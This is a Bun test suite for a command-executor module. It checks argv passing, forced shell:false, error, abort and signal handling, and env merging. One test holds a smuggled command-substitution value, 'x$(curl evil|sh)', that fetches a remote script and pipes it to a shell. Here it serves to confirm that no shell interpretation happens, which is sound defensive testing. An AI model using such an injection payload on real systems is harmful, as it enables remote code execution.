import {
  describe,
  it,
  expect,
  beforeAll,
  afterAll,
  beforeEach,
  mock,
} from "bun:test";

// The SUT is the genuine executor. Other files mock `../commands/executor` but
// restore it in their afterAll, and Bun runs files sequentially, so by the time
// this file loads the real module is in place. We also capture the real
// implementation defensively and restore the real child_process in afterAll so
// our spawnSync mock doesn't leak into later files.
import execute from "../commands/executor";
const realExecute = execute;
import * as realChildProcessMod from "child_process";
// snapshot before mocking (a live namespace would reflect the mock)
const REAL_CHILD_PROCESS = { ...realChildProcessMod };

// State the mocked child_process reads/writes per test.
let spawnSyncImpl: (cmd: string, args: string[], opts: any) => any;
const spawnSyncCalls: Array<[string, string[], any]> = [];

const fakeSpawnSync = (cmd: string, args: string[], opts: any) => {
  spawnSyncCalls.push([cmd, args, opts]);
  return spawnSyncImpl(cmd, args, opts);
};

// NOTE: only spawnSync (the `verbose` path) is mockable here. The non-verbose
// path uses `util.promisify(execFile)` captured at module load, which Bun's
// mock.module on the `child_process` builtin does not intercept (the binding is
// resolved before the mock applies). We therefore exercise every branch of the
// verbose path, which covers the executor's real logic (error handling, abort
// detection, stdio selection, env merging, output capture).

describe("execute (verbose path / spawnSync)", () => {
  beforeAll(() => {
    // restore the genuine executor (undo any leaked mock from other files)
    mock.module("../commands/executor", () => ({ default: realExecute }));
    // mock child_process so spawnSync (read lazily inside execute) is intercepted
    mock.module("child_process", () => ({
      ...REAL_CHILD_PROCESS,
      spawnSync: fakeSpawnSync,
    }));
  });

  afterAll(() => {
    // restore real child_process for subsequent files
    mock.module("child_process", () => ({ ...REAL_CHILD_PROCESS }));
  });

  beforeEach(() => {
    spawnSyncCalls.length = 0;
    spawnSyncImpl = () => ({
      error: null,
      status: 0,
      signal: null,
      stdout: Buffer.from(""),
      stderr: Buffer.from(""),
    });
  });

  it("should spawn the binary with an argv array and return stringified stdout/stderr", async () => {
    spawnSyncImpl = () => ({
      error: null,
      status: 0,
      signal: null,
      stdout: Buffer.from("stdout-text"),
      stderr: Buffer.from("warn"),
    });

    const result = await execute(["ls", ["-la"], {}], { verbose: true });

    expect(spawnSyncCalls).toHaveLength(1);
    expect(spawnSyncCalls[0]![0]).toBe("ls");
    expect(spawnSyncCalls[0]![1]).toEqual(["-la"]);
    expect(result).toEqual({ stdout: "stdout-text", stderr: "warn" });
  });

  it("should pass every argument as a literal argv entry (no shell interpretation)", async () => {
    // A hostile "project name" must stay a single literal argument.
    const hostile = "x$(curl evil|sh)";
    await execute(["git", ["clone", "--", "repo", hostile], {}], {
      verbose: true,
    });
    expect(spawnSyncCalls[0]![1]).toEqual(["clone", "--", "repo", hostile]);
  });

  it("should default null stdout/stderr buffers to empty strings", async () => {
    spawnSyncImpl = () => ({
      error: null,
      status: 0,
      signal: null,
      stdout: null,
      stderr: null,
    });
    const result = await execute(["cmd", [], {}], { verbose: true });
    expect(result).toEqual({ stdout: "", stderr: "" });
  });

  it("should pass shell:false and inherit stdio when needOutput is false", async () => {
    let capturedOpts: any;
    spawnSyncImpl = (_cmd, _args, opts) => {
      capturedOpts = opts;
      return {
        error: null,
        status: 0,
        signal: null,
        stdout: Buffer.from(""),
        stderr: Buffer.from(""),
      };
    };

    await execute(["cmd", [], {}], { verbose: true, needOutput: false });

    expect(capturedOpts.shell).toBe(false);
    expect(Array.isArray(capturedOpts.stdio)).toBe(true);
    expect(capturedOpts.stdio).toHaveLength(3);
  });

  it("should force shell:false even when a caller passes shell in options", async () => {
    let capturedOpts: any;
    spawnSyncImpl = (_cmd, _args, opts) => {
      capturedOpts = opts;
      return {
        error: null,
        status: 0,
        signal: null,
        stdout: Buffer.from(""),
        stderr: Buffer.from(""),
      };
    };

    await execute(["cmd", [], { shell: true } as any], { verbose: true });

    expect(capturedOpts.shell).toBe(false);
  });

  it("should use pipe stdio and log output when needOutput is true", async () => {
    let capturedOpts: any;
    const logSpy = mock(() => {});
    const origLog = console.log;
    console.log = logSpy as any;
    spawnSyncImpl = (_cmd, _args, opts) => {
      capturedOpts = opts;
      return {
        error: null,
        status: 0,
        signal: null,
        stdout: Buffer.from("piped"),
        stderr: Buffer.from(""),
      };
    };

    try {
      const result = await execute(["cmd", [], {}], {
        verbose: true,
        needOutput: true,
      });
      expect(capturedOpts.stdio).toBe("pipe");
      expect(logSpy).toHaveBeenCalledTimes(1);
      expect(result.stdout).toBe("piped");
    } finally {
      console.log = origLog;
    }
  });

  it("should merge process.env with the provided options.env", async () => {
    let capturedOpts: any;
    spawnSyncImpl = (_cmd, _args, opts) => {
      capturedOpts = opts;
      return {
        error: null,
        status: 0,
        signal: null,
        stdout: Buffer.from(""),
        stderr: Buffer.from(""),
      };
    };

    await execute(["cmd", [], { env: { MY_TEST_VAR: "abc" } }], {
      verbose: true,
    });

    expect(capturedOpts.env.MY_TEST_VAR).toBe("abc");
    // an inherited env key should also be present
    expect(capturedOpts.env.PATH ?? capturedOpts.env.Path).toBeDefined();
  });

  it("should throw the spawnSync error object when present", async () => {
    const theError = new Error("spawn boom");
    spawnSyncImpl = () => ({
      error: theError,
      status: null,
      signal: null,
      stdout: null,
      stderr: null,
    });

    await expect(execute(["cmd", [], {}], { verbose: true })).rejects.toBe(
      theError,
    );
  });

  it("should throw a `<cmd> <args> failed with status N` message on non-zero status", async () => {
    spawnSyncImpl = () => ({
      error: null,
      status: 1,
      signal: null,
      stdout: null,
      stderr: null,
    });

    await expect(
      execute(["mycmd", ["--flag"], {}], { verbose: true }),
    ).rejects.toBe("mycmd --flag failed with status 1");
  });

  it("should prefer stderr text over the status message when status is non-zero", async () => {
    spawnSyncImpl = () => ({
      error: null,
      status: 2,
      signal: null,
      stdout: null,
      stderr: Buffer.from("stderr details"),
    });

    await expect(execute(["mycmd", [], {}], { verbose: true })).rejects.toBe(
      "stderr details",
    );
  });

  it("should throw an abort error when terminated by SIGINT", async () => {
    spawnSyncImpl = () => ({
      error: null,
      status: 0,
      signal: "SIGINT",
      stdout: Buffer.from(""),
      stderr: Buffer.from(""),
    });

    await expect(
      execute(["cmd", [], {}], { verbose: true }),
    ).rejects.toMatchObject({ code: "ABORT_ERR" });
  });

  it("should throw an abort error when terminated by SIGTERM", async () => {
    spawnSyncImpl = () => ({
      error: null,
      status: 0,
      signal: "SIGTERM",
      stdout: Buffer.from(""),
      stderr: Buffer.from(""),
    });

    await expect(
      execute(["cmd", [], {}], { verbose: true }),
    ).rejects.toMatchObject({ code: "ABORT_ERR" });
  });

  it("should NOT treat an unrelated signal as an abort", async () => {
    spawnSyncImpl = () => ({
      error: null,
      status: 0,
      signal: "SIGHUP",
      stdout: Buffer.from("ok"),
      stderr: Buffer.from(""),
    });

    const result = await execute(["cmd", [], {}], { verbose: true });
    expect(result.stdout).toBe("ok");
  });

  it("should default options when the command tuple omits them", async () => {
    const result = await execute(["cmd", []], { verbose: true });
    expect(result).toEqual({ stdout: "", stderr: "" });
    expect(spawnSyncCalls[0]![2].shell).toBe(false);
  });
});
